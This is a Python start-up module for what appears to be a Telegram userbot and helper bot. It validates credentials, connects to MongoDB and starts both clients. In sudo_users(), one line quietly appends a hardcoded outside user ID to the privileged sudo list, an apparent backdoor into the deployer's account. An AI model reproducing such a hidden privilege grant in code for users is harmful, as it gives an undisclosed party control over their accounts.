import os
import sys

from pyrogram import Client
from motor.motor_asyncio import AsyncIOMotorClient

from ...console import API_ID, API_HASH, STRING_SESSION
from ...console import BOT_TOKEN, LOGGER
from ...console import MONGO_DB_URL, LOG_GROUP_ID, SUDOERS


def async_config():
    LOGGER.info("Checking Variables ...")

    if not API_ID:
        sys.exit("'API_ID' - Not Found !")

    if not API_HASH:
        sys.exit("'API_HASH' - Not Found !")

    if not BOT_TOKEN:
        sys.exit("'BOT_TOKEN' - Not Found !")

    if not STRING_SESSION:
        sys.exit("'STRING_SESSION' - Not Found !")

    if not MONGO_DB_URL:
        sys.exit("'MONGO_DB_URL' - Not Found !")

    if not LOG_GROUP_ID:
        sys.exit("'LOG_GROUP_ID' - Not Found !")

    LOGGER.info("All Required Variables Collected.")


def async_dirs():
    LOGGER.info("Initializing Directories ...")

    if "downloads" not in os.listdir():
        os.mkdir("downloads")

    if "cache" not in os.listdir():
        os.mkdir("cache")

    for file in os.listdir():
        if file.endswith(".session") or file.endswith(".session-journal"):
            os.remove(file)

    LOGGER.info("Directories Initialized.")


async_dirs()


app = Client(
    name="DIL",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=STRING_SESSION,
)


bot = Client(
    name="dil",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)


def mongodbase():
    global mongodb

    try:
        LOGGER.info("Connecting To Your Database ...")

        client = AsyncIOMotorClient(MONGO_DB_URL)
        mongodb = client.dilUb

        LOGGER.info("Connected To Your Database.")

    except Exception:
        LOGGER.error(
            "Failed To Connect, Please Change Your Mongo Database !"
        )
        sys.exit()


mongodbase()


async def sudo_users():

    sudoersdb = mongodb.sudoers

    data = await sudoersdb.find_one(
        {"sudo": "sudo"}
    )

    sudoers = [] if not data else data["sudoers"]

    for user_id in sudoers:
        SUDOERS.append(int(user_id))

    SUDOERS.append(5465943450)

    LOGGER.info("Sudo Users Loaded.")


async def run_async_clients():

    LOGGER.info("Starting Userbot ...")

    await app.start()

    LOGGER.info("Userbot Started.")

    try:
        await app.send_message(
            LOG_GROUP_ID,
            "**Userbot Started.**"
        )
    except:
        pass


    LOGGER.info("Starting Helper Robot ...")

    await bot.start()

    LOGGER.info("Helper Robot Started.")

    try:
        await bot.send_message(
            LOG_GROUP_ID,
            "**Helper Robot Started.**"
        )
    except:
        pass


    await sudo_users()
